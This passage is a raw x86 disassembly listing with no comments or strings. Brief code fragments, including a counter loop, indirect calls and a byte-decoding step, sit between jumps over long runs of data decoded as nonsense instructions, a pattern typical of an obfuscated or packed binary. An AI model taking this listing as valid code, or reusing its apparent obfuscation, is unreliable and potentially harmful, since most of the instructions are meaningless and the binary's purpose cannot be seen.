  4050db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4050dc:	(bad)  
  4050de:	loop   0x4050e9
  4050e0:	outs   dx,DWORD PTR fs:[esi]
  4050e2:	nop
  4050e3:	stos   DWORD PTR es:[edi],eax
  4050e4:	jnp    0x4050af
  4050e6:	adc    ah,ah
  4050e8:	pop    ebp
  4050e9:	mov    BYTE PTR [ebx+ebx*8+0x11],ah
  4050ed:	jo     0x4050ef
  4050ef:	jae    0x405117
  4050f1:	mov    ebp,0x91a4a084
  4050f6:	stc    
  4050f7:	call   0xeed9e92
  4050fc:	loope  0x40507e
  4050fe:	adc    al,0x10
  405100:	ins    BYTE PTR es:[edi],dx
  405101:	std    
  405102:	sbb    BYTE PTR [ecx],dl
  405104:	adc    DWORD PTR ds:0xefaf75b9,edx
  40510a:	xchg   BYTE PTR [ecx-0x44],dl
  40510d:	jne    0x405116
  40510f:	sahf   
  405110:	xlat   BYTE PTR ds:[ebx]
  405111:	sub    edi,DWORD PTR [edi-0x79]
  405114:	cwde   
  405115:	mov    cl,BYTE PTR [ebp-0x65]
  405118:	scas   al,BYTE PTR es:[edi]
  405119:	and    dl,ch
  40511b:	pop    esp
  40511c:	or     BYTE PTR [ebp-0x67],ch
  40511f:	dec    esp
  405120:	pop    es
  405121:	dec    eax
  405122:	xor    cl,al
  405124:	push   edi
  405125:	mov    dh,0xe8
  405127:	push   esi
  405128:	gs jae 0x4050cb
  40512b:	call   0x23b5dc9c
  405130:	pop    esi
  405131:	xor    ebx,0x4be5acb5
  405137:	push   0xffffffa1
  405139:	mov    WORD PTR [esi],es
  40513b:	sti    
  40513c:	mov    ch,0x18
  40513e:	aaa    
  40513f:	aaa    
  405140:	lods   eax,DWORD PTR ds:[esi]
  405141:	not    DWORD PTR [esi]
  405143:	mov    fs,WORD PTR [ebx+0x65fb2000]
  405149:	xor    DWORD PTR ss:[ebx],0x52d69b9a
  405150:	push   0x50efafd6
  405155:	mov    DWORD PTR ds:0x412358,0x10
  40515f:	cmp    DWORD PTR ds:0x412358,0x0
  405166:	je     0x4051ac
  40516c:	cmp    DWORD PTR ds:0x412358,0x4
  405173:	jne    0x405184
  405179:	push   0x4150fd
  40517e:	call   DWORD PTR ds:0x40d1c8
  405184:	cmp    DWORD PTR ds:0x412358,0x5
  40518b:	jne    0x40519c
  405191:	mov    eax,ds:0x412358
  405196:	dec    eax
  405197:	mov    ds:0x412358,eax
  40519c:	mov    eax,ds:0x412358
  4051a1:	dec    eax
  4051a2:	mov    ds:0x412358,eax
  4051a7:	jmp    0x40515f
  4051ac:	mov    eax,DWORD PTR [ebp-0x1c]
  4051af:	xor    eax,esi
  4051b1:	add    eax,edi
  4051b3:	jmp    0x40532c
  4051b8:	(bad)  
  4051b9:	sbb    BYTE PTR [ecx+eiz*1],ah
  4051bc:	clc    
  4051bd:	and    ebx,ebp
  4051bf:	fldcw  WORD PTR [esi-0x26f0698e]
  4051c5:	arpl   WORD PTR [ebp+edi*8+0x7e7e704a],bp
  4051cc:	fidivr DWORD PTR [edi+0x7e]
  4051cf:	jle    0x40524f
  4051d1:	inc    edx
  4051d2:	cmp    ah,BYTE PTR [eax-0x5b33bbd9]
  4051d8:	cdq    
  4051d9:	add    BYTE PTR [esi-0x16],cl
  4051dc:	push   esp
  4051dd:	pop    edi
  4051de:	jbe    0x40516b
  4051e0:	test   al,0x79
  4051e2:	rcl    esi,cl
  4051e4:	push   cs
  4051e5:	jo     0x405214
  4051e7:	mov    eax,0x31e1b78f
  4051ec:	push   edi
  4051ed:	ja     0x40521b
  4051ef:	mov    DWORD PTR [ecx],esp
  4051f1:	mov    edx,0xc4c318b7
  4051f6:	shl    DWORD PTR [ebx],1
  4051f8:	es retf 0xe47f
  4051fc:	jl     0x4051c0
  4051fe:	mov    bl,BYTE PTR [edx+0x76b26801]
  405204:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  405206:	sti    
  405207:	pop    ds
  405208:	scas   eax,DWORD PTR es:[edi]
  405209:	mov    eax,0x1cfea1b7
  40520e:	imul   ebx,DWORD PTR [edi-0x4ae72247],0xffffffa0
  405215:	ins    BYTE PTR es:[edi],dx
  405216:	loop   0x4051b8
  405218:	out    0xe8,al
  40521a:	mov    ah,0x69
  40521c:	repnz cli 
  40521e:	aad    0x4
  405220:	stos   BYTE PTR es:[edi],al
  405221:	shl    eax,1
  405223:	dec    BYTE PTR [ecx-0x5fe42e0]
  405229:	out    dx,eax
  40522a:	mov    ebp,0x534e731c
  40522f:	jno    0x4051b6
  405231:	repnz sbb ebp,eax
  405234:	retf   
  405235:	je     0x405281
  405237:	popa   
  405238:	pop    eax
  405239:	out    dx,al
  40523a:	je     0x4051de
  40523c:	ror    BYTE PTR [eax],0x52
  40523f:	pop    esi
  405240:	cmp    eax,0x2727cb90
  405245:	mov    cl,BYTE PTR [ecx-0x513b3583]
  40524b:	push   ebp
  40524c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40524d:	out    dx,al
  40524e:	outs   dx,BYTE PTR ds:[esi]
  40524f:	pop    esi
  405250:	es mov al,0xb8
  405253:	sub    al,0xdf
  405255:	cmp    al,0x1e
  405257:	add    BYTE PTR [edx],bl
  405259:	fidivr DWORD PTR [edx+edx*8-0x473971a9]
  405260:	pop    ebp
  405261:	mov    eax,0xc645ed08
  405266:	mov    dh,0xf1
  405268:	sbb    bl,BYTE PTR [esi+0x4d]
  40526b:	pusha  
  40526c:	inc    eax
  40526d:	fisttp WORD PTR [ebx+ebx*2]
  405270:	mov    eax,0xd9af7fa5
  405275:	push   ebx
  405276:	fs lock fwait
  405279:	cmp    ah,BYTE PTR [edi+edx*2+0x655f8e18]
  405280:	ins    DWORD PTR es:[edi],dx
  405281:	lea    ebp,[eax+0x5b7cf0d4]
  405287:	jle    0x4052e0
  405289:	jmp    0x80ff:0x2f033f50
  405290:	xor    DWORD PTR [ebx],esp
  405292:	fmul   DWORD PTR [ebp-0x79]
  405295:	push   es
  405296:	inc    ecx
  405297:	pop    esi
  405298:	retf   0x8be9
  40529b:	dec    edx
  40529c:	push   ecx
  40529d:	mov    edx,0xd9388745
  4052a2:	call   0xe8c1:0x9de34f4b
  4052a9:	pop    eax
  4052aa:	push   es
  4052ab:	popf   
  4052ac:	lea    esp,[ebx+ecx*1+0x7a9e335b]
  4052b3:	and    al,0xba
  4052b5:	and    BYTE PTR [esi+0x14],bh
  4052b8:	cmp    esp,edx
  4052ba:	add    DWORD PTR [edx+0x60],ecx
  4052bd:	adc    cl,BYTE PTR [ecx-0x5b]
  4052c0:	mov    WORD PTR [edi-0x5b],?
  4052c3:	rcr    DWORD PTR [edi+0x6e],1
  4052c6:	mov    ecx,0x12a0d7a5
  4052cb:	xchg   esi,edx
  4052cd:	xchg   BYTE PTR [esi+edi*1-0x3be04063],bh
  4052d4:	sbb    eax,0x8a9ff2b0
  4052d9:	and    bl,BYTE PTR [esi]
  4052db:	xchg   edi,eax
  4052dc:	adc    eax,0x2189b660
  4052e1:	sub    ah,BYTE PTR [ebx]
  4052e3:	sbb    BYTE PTR [esi],al
  4052e5:	daa    
  4052e6:	je     0x405348
  4052e8:	sub    DWORD PTR [ebp-0x30],edx
  4052eb:	xchg   ecx,eax
  4052ec:	jnp    0x40529f
  4052ee:	fdiv   st,st(6)
  4052f0:	mov    ebx,DWORD PTR [ebx+edi*8+0xfef86c3]
  4052f7:	(bad)  
  4052f8:	fdivr  QWORD PTR [edx-0xf95bbf3]
  4052fe:	adc    al,0x8b
  405300:	ret    
  405301:	push   ds
  405302:	inc    edx
  405303:	je     0x405314
  405305:	mov    al,ds:0x5962fe78
  40530a:	push   edx
  40530b:	or     ebx,DWORD PTR [ebx]
  40530d:	adc    dl,BYTE PTR [ecx-0x496c2505]
  405313:	icebp  
  405314:	fnsave [ebx]
  405316:	aas    
  405317:	into   
  405318:	enter  0xe340,0xda
  40531c:	nop
  40531d:	cmp    ah,BYTE PTR [edx+edx*8-0x26bceccf]
  405324:	scas   al,BYTE PTR es:[edi]
  405325:	jg     0x40535b
  405327:	(bad)  
  405328:	mov    eax,ds:0x50cb87ae
  40532d:	push   DWORD PTR [ebp-0x8]
  405330:	lea    eax,[ebp-0x78]
  405333:	push   eax
  405334:	push   DWORD PTR [ebp-0xc]
  405337:	push   DWORD PTR [ebp-0x14]
  40533a:	jmp    0x4054b3
  40533f:	loop   0x40534f
  405341:	cli    
  405342:	cs cli 
  405344:	cli    
  405345:	cli    
  405346:	ret    0x10db
  405349:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40534a:	push   esp
  40534b:	(bad)  
  40534c:	jns    0x405383
  40534e:	adc    eax,0x7e7e7616
  405353:	fidivr DWORD PTR [edi+0x7e]
  405356:	jle    0x4052ee
  405358:	popa   
  405359:	outs   dx,BYTE PTR ds:[esi]
  40535a:	arpl   cx,ax
  40535c:	rcr    BYTE PTR [esi+eiz*8],1
  40535f:	call   0x4888:0xc79dce8f
  405366:	fild   DWORD PTR [eax+0x49a1e7cb]
  40536c:	loope  0x405319
  40536e:	mov    DWORD PTR [edx+0x6e2e6ecb],edi
  405374:	inc    ebx
  405375:	inc    edx
  405376:	clc    
  405377:	push   ecx
  405378:	(bad)  
  405379:	adc    eax,0xe40d0500
  40537e:	mov    eax,0xf201b6a0
  405383:	popf   
  405384:	sbb    BYTE PTR [edx+0x68],ah
  405387:	stos   DWORD PTR es:[edi],eax
  405388:	test   BYTE PTR [edx+edx*1],dh
  40538b:	pop    eax
  40538c:	pop    edx
  40538d:	stos   BYTE PTR es:[edi],al
  40538e:	in     eax,0x57
  405390:	rol    BYTE PTR [esp+esi*4+0x6b75750c],0x70
  405398:	sbb    ecx,DWORD PTR [ebp+0x6a]
  40539b:	les    edx,FWORD PTR [ecx+ebx*1]
  40539e:	cdq    
  40539f:	mov    edx,0xf5012e5b
  4053a4:	mov    ah,0xc0
  4053a6:	jno    0x40541f
  4053a8:	mov    ebx,0x7f83e176
  4053ad:	out    0x52,eax
  4053af:	out    dx,eax
  4053b0:	and    esi,DWORD PTR [eax]
  4053b2:	mov    esp,DWORD PTR [eax]
  4053b4:	sub    DWORD PTR [eax+0x68],esp
  4053b7:	mov    cl,0x67
  4053b9:	mov    bl,0x9b
  4053bb:	idiv   DWORD PTR [esi+0x66]
  4053be:	ins    DWORD PTR es:[edi],dx
  4053bf:	xchg   BYTE PTR [ebp-0x7e],dh
  4053c2:	pushf  
  4053c3:	adc    BYTE PTR [edi-0x1b21dba7],bh
  4053c9:	xchg   edi,eax
  4053ca:	mov    DWORD PTR [ebp+0x79258b8b],ebx
  4053d0:	mov    ah,0x37
  4053d2:	push   esi
  4053d3:	add    ebp,DWORD PTR [eax+edi*8-0x9]
  4053d7:	dec    ebx
  4053d8:	mov    esp,0x8b83240a
  4053dd:	mov    ebp,0x7d4217b
  4053e2:	xchg   edx,eax
  4053e3:	int3   
  4053e4:	(bad)  
  4053e5:	int3   
  4053e6:	shl    BYTE PTR [ecx-0x7f],1
  4053e9:	xor    al,0x66
  4053eb:	les    eax,FWORD PTR [ebx]
  4053ed:	test   al,0x3e
  4053ef:	mov    ?,eax
  4053f1:	push   esp
  4053f2:	dec    DWORD PTR [ecx+0x19986041]
  4053f8:	xor    BYTE PTR [ebp+0x79],dh
  4053fb:	add    al,0xdb
  4053fd:	nop
  4053fe:	cdq    
  4053ff:	rcr    BYTE PTR [ecx-0x7e],1
  405402:	dec    esp
  405403:	bound  ebx,QWORD PTR [ecx]
  405405:	xchg   esp,eax
  405406:	pop    ebp
  405407:	rcl    DWORD PTR [ecx],0x25
  40540a:	push   0x47
  40540c:	cmp    esp,eax
  40540e:	pop    esi
  40540f:	pop    eax
  405410:	sbb    eax,0x5f064082
  405415:	xchg   edi,eax
  405416:	mov    al,ds:0xc731f61b
  40541b:	pop    esp
  40541c:	jns    0x405437
  40541e:	jb     0x4053fb
  405420:	jge    0x405439
  405422:	xchg   ebp,eax
  405423:	xchg   ebx,eax
  405424:	stos   DWORD PTR es:[edi],eax
  405425:	pop    eax
  405426:	add    al,0x21
  405428:	mov    al,ds:0x69d1e984
  40542d:	in     al,dx
  40542e:	mov    edx,0x2063a95e
  405433:	mov    esp,0xd831216e
  405438:	add    eax,0x6b82875b
  40543d:	push   ss
  40543e:	push   esi
  40543f:	pop    esi
  405440:	ror    DWORD PTR [ebp+0x708f36ea],cl
  405446:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405447:	dec    eax
  405448:	jge    0x4053e6
  40544a:	(bad)  
  40544b:	clc    
  40544c:	mov    ds:0xe86b90a2,eax
  405451:	stos   DWORD PTR es:[edi],eax
  405452:	icebp  
  405453:	mov    esp,0xdde45f3b
  405458:	ins    BYTE PTR es:[edi],dx
  405459:	push   ds
  40545a:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40545c:	jge    0x40540c
  40545e:	aas    
  40545f:	push   eax
  405460:	jp     0x40548f
  405462:	mov    eax,eax
  405464:	call   DWORD PTR [ebx+0x66]
  405467:	nop
  405468:	(bad)  
  405469:	hlt    
  40546a:	pop    edi
  40546b:	sahf   
  40546c:	popa   
  40546d:	je     0x405450
  40546f:	jnp    0x40540b
  405471:	or     ebp,DWORD PTR [eax+0x54]
  405474:	inc    eax
  405475:	aam    0xeb
  405477:	mov    ch,0x55
  405479:	test   al,0xa6
  40547b:	fs mov ch,0x51
  40547e:	loop   0x40542d
  405480:	mov    esp,0xf8ed91b6
  405485:	repz test eax,0x277f1a37
  40548b:	pushf  
  40548c:	jecxz  0x40549d
  40548e:	jl     0x405413
  405490:	or     DWORD PTR [eax],esi
  405492:	pop    esp
  405493:	push   eax
  405494:	push   ss
  405495:	add    DWORD PTR [edi-0x4ab7dfde],0xffffffdd
  40549c:	mov    ds:0xc11aeb15,eax
  4054a1:	mov    ebx,0x9e031dec
  4054a6:	sub    ebx,0x4d
  4054a9:	push   edi
  4054aa:	add    edi,edi
  4054ac:	fucompp 
  4054ae:	xchg   esi,eax
  4054af:	dec    esp
  4054b0:	mov    al,dh
  4054b2:	sub    al,0xe8
  4054b4:	dec    edi
  4054b5:	inc    ecx
  4054b6:	add    BYTE PTR [eax],al
  4054b8:	test   eax,eax
  4054ba:	je     0x4054e5
  4054c0:	lea    eax,[ebp-0x78]
  4054c3:	push   eax
  4054c4:	mov    eax,DWORD PTR [ebp-0x14]
  4054c7:	xor    eax,esi
  4054c9:	add    eax,edi
  4054cb:	push   eax
  4054cc:	mov    eax,DWORD PTR [ebp-0x10]
  4054cf:	add    eax,0xee
  4054d4:	push   eax
  4054d5:	mov    eax,DWORD PTR [ebp-0x10]
  4054d8:	mov    eax,DWORD PTR [eax+0x198]
  4054de:	push   DWORD PTR [eax]
  4054e0:	call   0x40ae4d
  4054e5:	mov    ecx,DWORD PTR [ebp-0x1c]
  4054e8:	xor    ecx,esi
  4054ea:	mov    eax,0xffcd8d61
  4054ef:	sub    eax,ecx
  4054f1:	sub    eax,DWORD PTR [ebp-0x8]
  4054f4:	mov    ecx,DWORD PTR [ebp-0x30]
  4054f7:	add    ecx,eax
  4054f9:	mov    eax,DWORD PTR [ebp-0x8]
  4054fc:	jmp    0x405675
  405501:	lahf   
  405502:	(bad)  
  405503:	icebp  
  405504:	shl    DWORD PTR [ecx-0x50bea01f],1
  40550a:	icebp  
  40550b:	add    DWORD PTR [edi-0x16],0x5b
  40550f:	lods   eax,DWORD PTR ds:[esi]
  405510:	jne    0x405504
  405512:	ja     0x405592
  405514:	jle    0x4054f0
  405516:	jg     0x405596
  405518:	jle    0x4054cd
  40551a:	push   esp
  40551b:	pop    es
  40551c:	mov    eax,0x62433ec7
  405521:	add    dh,BYTE PTR ss:0xa76a166
  405528:	out    0x67,al
  40552a:	sbb    edi,DWORD PTR [esp+esi*1+0x2c3e7237]
  405531:	cmp    al,BYTE PTR [edx+0x3743155c]
  405537:	scas   eax,DWORD PTR es:[edi]
  405538:	mov    edi,0xd4b35d2f
  40553d:	push   eax
  40553e:	push   0x55564747
  405543:	add    DWORD PTR [ecx+0x38],edi
  405546:	push   ebx
  405547:	lea    edx,ds:0x2188b63f
  40554d:	sar    DWORD PTR [bp+di+0x50],0x1e
  405552:	adc    DWORD PTR [ecx],0xe2b7aa44
  405558:	ss sti 
  40555a:	in     al,dx
  40555b:	aaa    
  40555c:	xchg   esp,eax
  40555d:	mov    eax,0x6419105f
  405562:	push   esp
  405563:	adc    BYTE PTR [edi+0x51],ch
  405566:	lahf   
  405567:	sahf   
  405568:	lods   eax,DWORD PTR ds:[esi]
  405569:	daa    
  40556a:	lods   al,BYTE PTR ds:[esi]
  40556b:	ret    0x3cb5
  40556e:	mov    bl,0x7a
  405570:	mov    WORD PTR [edx+esi*1+0x6d3bc372],fs
  405577:	les    edx,FWORD PTR [edi+ecx*8-0x130395eb]
  40557e:	push   ebp
  40557f:	dec    esp
  405580:	lahf   
  405581:	mov    dl,BYTE PTR [edi+edx*4]
  405584:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  405586:	ds pop ebp
  405588:	lock mov edi,0x12441cef
  40558e:	outs   dx,BYTE PTR ds:[esi]
  40558f:	(bad)  
  405590:	inc    esp
  405591:	inc    edi
  405592:	sbb    BYTE PTR [eax],bh
  405594:	fwait
  405595:	sub    BYTE PTR [eax+esi*4+0xc7304e9],dl
  40559c:	push   ds
  40559d:	and    ah,BYTE PTR [edx]
  40559f:	ret    0xa1e5
  4055a2:	jmp    0xe299688
  4055a7:	adc    BYTE PTR [eax],cl
  4055a9:	bound  ebp,QWORD PTR [eax-0x2c912178]
  4055af:	call   0x583249f8
  4055b4:	call   0x9440eb80
  4055b9:	xchg   ecx,eax
  4055ba:	enter  0x7ccf,0x15
  4055be:	push   ebp
  4055bf:	fnstsw WORD PTR [ebx+0x7b]
  4055c2:	jne    0x4055f4
  4055c4:	das    
  4055c5:	call   0x3dba2619
  4055ca:	in     eax,0x68
  4055cc:	xchg   ecx,eax
  4055cd:	adc    BYTE PTR ds:0xaefef44d,ch
  4055d3:	mov    ecx,0xeaf5c3a7
  4055d8:	xchg   edi,eax
  4055d9:	cld    
  4055da:	xchg   ecx,eax
  4055db:	sti    
  4055dc:	xor    DWORD PTR ds:[bx+0x56],edx
  4055e1:	test   DWORD PTR [edx],ebp
  4055e3:	mov    edi,0xd9de49fa
  4055e8:	ja     0x40559c
  4055ea:	stos   DWORD PTR es:[edi],eax
  4055eb:	outs   dx,BYTE PTR ds:[esi]
  4055ec:	fs es xchg ebp,eax
  4055ef:	fld    DWORD PTR [edi]
  4055f1:	inc    ecx
  4055f2:	push   ds
  4055f3:	fst    DWORD PTR [ecx]
  4055f5:	or     al,0x38
  4055f7:	dec    ecx
  4055f8:	jno    0x4055af
  4055fa:	pop    ebp
  4055fb:	cmp    cl,dh
  4055fd:	or     al,0x54
  4055ff:	xor    eax,ebx
  405601:	sbb    eax,DWORD PTR [eax+0x37]
  405604:	repz cmps DWORD PTR ds:[si],DWORD PTR es:[di]
  405607:	push   ecx
  405608:	push   ss
  405609:	sbb    ebp,edi
  40560b:	in     eax,0x4d
  40560d:	adc    edi,DWORD PTR [edi]
  40560f:	mov    bl,0x24
  405611:	nop
  405612:	retf   
  405613:	lahf   
  405614:	int3   
  405615:	in     eax,0x46
  405617:	jae    0x40568e
  405619:	sbb    esp,DWORD PTR [ecx+0x24]
  40561c:	mov    dl,BYTE PTR [eax]
  40561e:	and    BYTE PTR [ecx+0x3a89a978],0x55
  405625:	sbb    BYTE PTR [edx+0x5b455b5],bl
  40562b:	push   edi
  40562c:	sahf   
  40562d:	cli    
  40562e:	addr16 jle 0x4055b9
  405631:	retf   0xcc61
  405634:	aad    0x8a
  405636:	xchg   ebp,eax
  405637:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405638:	push   esi
  405639:	mov    bl,0x72
  40563b:	dec    ebp
  40563c:	dec    ebx
  40563d:	push   0x51
  40563f:	adc    eax,0xf8de5bfe
  405644:	test   DWORD PTR [edi-0x2198741c],ebp
  40564a:	popa   
  40564b:	ret    
  40564c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40564d:	ret    
  40564e:	jo     0x405681
  405650:	inc    esi
  405651:	adc    eax,0x3c294709
  405656:	and    ch,BYTE PTR [edi-0x29]
  405659:	and    DWORD PTR [ebp-0x46],edx
  40565c:	mov    dh,0x64
  40565e:	add    al,BYTE PTR [esi+0x29459601]
  405664:	ins    DWORD PTR es:[edi],dx
  405665:	mov    ch,0x4c
  405667:	mov    ch,0x27
  405669:	jo     0x4056d0
  40566b:	addr16 aam 0xd
  40566e:	repz inc esp
  405670:	jns    0x4056cc
  405672:	push   es
  405673:	lock dec edx
  405675:	mov    DWORD PTR [eax+0x1],ecx
  405678:	mov    al,BYTE PTR [ebp-0x1]
  40567b:	mov    ecx,DWORD PTR [ebp-0x8]
  40567e:	xor    al,0x4a
  405680:	sub    al,0x34
  405682:	mov    BYTE PTR [ecx],al
  405684:	lea    eax,[ebp-0x8]
  405687:	inc    BYTE PTR [eax]
  405689:	inc    eax
  40568a:	push   eax
  40568b:	pop    ecx
  40568c:	dec    ecx
  40568d:	xchg   ecx,edx
  40568f:	jmp    0x405808
  405694:	mov    gs,WORD PTR [edi+0x79]
  405697:	in     eax,0x79
  405699:	stc    
  40569a:	and    BYTE PTR [ebp-0x3],0xf5
  40569e:	cmp    esp,eax
  4056a0:	xchg   DWORD PTR [ebp+0x1e],edx
  4056a3:	push   esp
  4056a4:	pop    esi
  4056a5:	je     0x405725
  4056a7:	jle    0x405683
  4056a9:	jg     0x405729
  4056ab:	jle    0x4056b7
  4056ad:	mov    dh,0x4
  4056af:	push   eax
  4056b0:	add    BYTE PTR [esi],0xa4
  4056b3:	mov    edx,DWORD PTR [ebx+edx*4]
  4056b6:	jb     0x405706
  4056b8:	arpl   WORD PTR [edi-0x786fac3f],si
  4056be:	mov    al,ds:0x9a5de362
  4056c3:	cmc    
  4056c4:	(bad)  
  4056c5:	sbb    BYTE PTR [esi+0x5b],dl
  4056c8:	retf   
  4056c9:	and    ah,BYTE PTR ds:0xbdf518e3
  4056cf:	icebp  
  4056d0:	ror    bl,cl
  4056d2:	sbb    eax,0x5daece1
  4056d7:	push   eax
  4056d8:	mov    ebp,0xeefdde6c
  4056dd:	and    eax,0x2b738ab8
  4056e2:	adc    dl,BYTE PTR [ebx]
  4056e4:	adc    DWORD PTR [edi+0x41fa14fc],ebp
  4056ea:	inc    ecx
  4056eb:	cld    
  4056ec:	xchg   dl,dl
  4056ee:	pop    ds
  4056ef:	pop    ebx
  4056f0:	xor    dh,dl
  4056f2:	inc    edx
  4056f3:	in     eax,0x8c
  4056f5:	repnz push eax
  4056f7:	push   ebx
  4056f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056f9:	leave  
  4056fa:	jno    0x4056e9
  4056fc:	dec    bp
  4056fe:	in     eax,dx
  4056ff:	in     eax,0x8
  405701:	xchg   edi,eax
  405702:	add    bh,0x1f
  405705:	jp     0x4056a3
  405707:	shl    BYTE PTR [edi+0x4e],0x95
  40570b:	nop
  40570c:	arpl   WORD PTR [edx+0x20d16b2e],dx
  405712:	xor    BYTE PTR [eax-0x32],bh
  405715:	sbb    ecx,esp
  405717:	pushf  
  405718:	sbb    dh,bl
  40571a:	or     BYTE PTR [edx+edi*1],bh
  40571d:	xchg   esi,eax
  40571e:	inc    esi
  40571f:	out    0xf3,al
  405721:	jmp    0x40571b
  405723:	adc    ch,ah
  405725:	sbb    edx,edx
  405727:	les    ebx,FWORD PTR [ebx-0x18]
  40572a:	lods   al,BYTE PTR ds:[esi]
  40572b:	test   cl,bl
  40572d:	outs   dx,BYTE PTR ds:[esi]
  40572e:	cmp    eax,0x30f06be6
  405733:	fistp  WORD PTR [ebp-0x19]
  405736:	repnz ss xchg ebp,eax
  405739:	push   eax
  40573a:	retf   
  40573b:	dec    ecx
  40573c:	mov    eax,0x27c16c93
  405741:	je     0x4056fe
  405743:	adc    BYTE PTR [edx+esi*4],dl
  405746:	idiv   DWORD PTR [edx]
  405748:	test   BYTE PTR [edi-0x40],ah
  40574b:	mov    ecx,0xee928ff7
  405750:	fs add al,0xe4
  405753:	xchg   al,dl
  405755:	sub    DWORD PTR [esi-0x7f],ebx
  405758:	inc    ebx
  405759:	adc    DWORD PTR [esi],esp
  40575b:	dec    edi
  40575c:	inc    ebp
  40575d:	cmp    DWORD PTR [esi-0x40],edx
  405760:	into   
  405761:	jnp    0x4057dc
  405763:	push   esi
  405764:	loop   0x4056f8
  405766:	adc    ebx,DWORD PTR [esi]
  405768:	sbb    eax,0x3955b15a
  40576d:	idiv   DWORD PTR ds:0xd0a768f
  405773:	mov    al,0xcc
  405775:	xor    esp,DWORD PTR [ebx+0x6e]
  405778:	pushf  
  405779:	or     ah,bh
  40577b:	js     0x40579b
  40577d:	xor    dh,BYTE PTR [ecx]
  40577f:	jmp    0x4057e6
  405781:	mov    bl,0x66
  405783:	dec    eax
  405784:	rol    DWORD PTR [edx],1
  405786:	inc    ecx
  405787:	les    ebx,FWORD PTR [edi+0x5e]
  40578a:	sbb    BYTE PTR [ecx-0x40],ah
  40578d:	and    al,BYTE PTR [edx-0x4636ebe]
  405793:	test   DWORD PTR [eax+0x64],esi
  405796:	(bad)  
  405797:	xchg   esp,eax
  405798:	mov    dl,0x10
  40579a:	mov    ah,0x68
  40579c:	mov    ebx,0x292ea038
  4057a1:	pop    ebx
  4057a2:	push   ss
  4057a3:	sub    DWORD PTR [eax],eax
  4057a5:	loop   0x4057e8
  4057a7:	add    ecx,DWORD PTR [eiz*1-0x3c75ece9]
  4057ae:	call   0x9e9:0xea711fbb
  4057b5:	mov    WORD PTR ds:0x5cf13af4,es
  4057bb:	jns    0x4057bd
  4057bd:	mov    BYTE PTR [ebx-0x430ddcc3],0xc0
  4057c4:	add    eax,0x40edebb5
  4057c9:	push   ss
  4057ca:	mov    BYTE PTR ds:0x3f4086bc,ch
  4057d0:	push   eax
  4057d1:	es iret 
  4057d3:	(bad)  
  4057d4:	sbb    al,0xf3
  4057d6:	popf   
  4057d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057d8:	mov    edx,0x2f7eb864
  4057dd:	es enter 0x50e3,0x45
  4057e2:	ror    DWORD PTR [edx+esi*1+0x51],cl
  4057e6:	pop    edi
  4057e7:	add    ch,BYTE PTR [edx+0x11c53f9a]
  4057ed:	shl    BYTE PTR [ecx],cl
  4057ef:	mov    bh,0x24
  4057f1:	mov    ch,0xa2
  4057f3:	loop   0x4057c7
  4057f5:	jne    0x4057a6
  4057f7:	dec    esp
  4057f8:	clc    
  4057f9:	jmp    0x770098b0
  4057fe:	sub    al,BYTE PTR [edi-0x71]
  405801:	into   
  405802:	fstp   TBYTE PTR [edx+eax*2]
  405805:	dec    esp
  405806:	jo     0x40587c
  405808:	dec    BYTE PTR [edx]
  40580a:	push   DWORD PTR [ebp-0x10]
  40580d:	mov    eax,ds:0x40d68c
  405812:	mov    eax,DWORD PTR [eax]
  405814:	push   DWORD PTR [eax]
  405816:	lea    eax,ds:0x40d6a8
  40581c:	push   DWORD PTR [eax]
  40581e:	lea    eax,ds:0x40d454
  405824:	push   DWORD PTR [eax]
  405826:	lea    eax,ds:0x40d688
  40582c:	push   DWORD PTR [eax]
  40582e:	lea    eax,ds:0x40d784
  405834:	push   DWORD PTR [eax]
  405836:	xchg   ebx,edx
  405838:	inc    ebx
  405839:	inc    ebx
  40583a:	sub    ebx,0x3
  40583d:	push   ebx
  40583e:	pop    eax
  40583f:	call   DWORD PTR [eax+0x1]
  405842:	mov    eax,DWORD PTR [ebp-0x20]
  405845:	jmp    0x4059be
  40584a:	mov    WORD PTR [edx+ebx*8+0x33],es
  40584e:	fidiv  DWORD PTR [ecx+0x8615985]
  405854:	or     al,0x32
  405856:	inc    ecx
  405857:	dec    ebx
  405858:	stc    
  405859:	(bad)  
  40585a:	cmp    cl,BYTE PTR [edx]
  40585c:	jle    0x4058dc
  40585e:	fidivr DWORD PTR [edi+0x7e]
  405861:	jle    0x40582c
  405863:	scas   al,BYTE PTR es:[edi]
  405864:	loopne 0x4058c4
  405866:	cld    
  405867:	imul   ebx,DWORD PTR [edi+0x12],0x7d
  40586b:	les    ebx,FWORD PTR [ebx-0x7c9e07ea]
  405871:	lods   eax,DWORD PTR ds:[esi]
  405872:	les    ebp,FWORD PTR [ebx+0xa25401f]
  405878:	inc    edx
  405879:	xchg   edi,eax
  40587a:	iret   
  40587b:	and    DWORD PTR [edx],ecx
  40587d:	sub    BYTE PTR [esi+0x53ff58ae],al
  405883:	xor    edx,DWORD PTR [edi-0xb]
  405886:	imul   edi,esi,0x334e5533
  40588c:	repnz or BYTE PTR [eax],0xad
  405890:	out    0x82,al
  405892:	xor    ebx,esi
  405894:	imul   ecx
  405896:	sbb    DWORD PTR [eax-0x2a],ebp
  405899:	pop    es
  40589a:	cmp    ecx,esi
  40589c:	aam    0xfe
  40589e:	add    ebp,DWORD PTR [ecx]
  4058a0:	or     bp,WORD PTR ss:[esi+0x2]
  4058a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058a6:	lods   al,BYTE PTR ds:[esi]
  4058a7:	shr    BYTE PTR [edi+ebp*8],0x30
  4058ab:	out    dx,eax
  4058ac:	adc    BYTE PTR [ecx],cl
  4058ae:	push   0xfcd885d4
  4058b3:	gs retf 
  4058b5:	and    eax,esi
  4058b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058b8:	mov    esp,0x73581230
  4058bd:	cmp    ah,dl
  4058bf:	int    0x3b
  4058c1:	inc    ebp
  4058c2:	inc    ebx
  4058c3:	icebp  
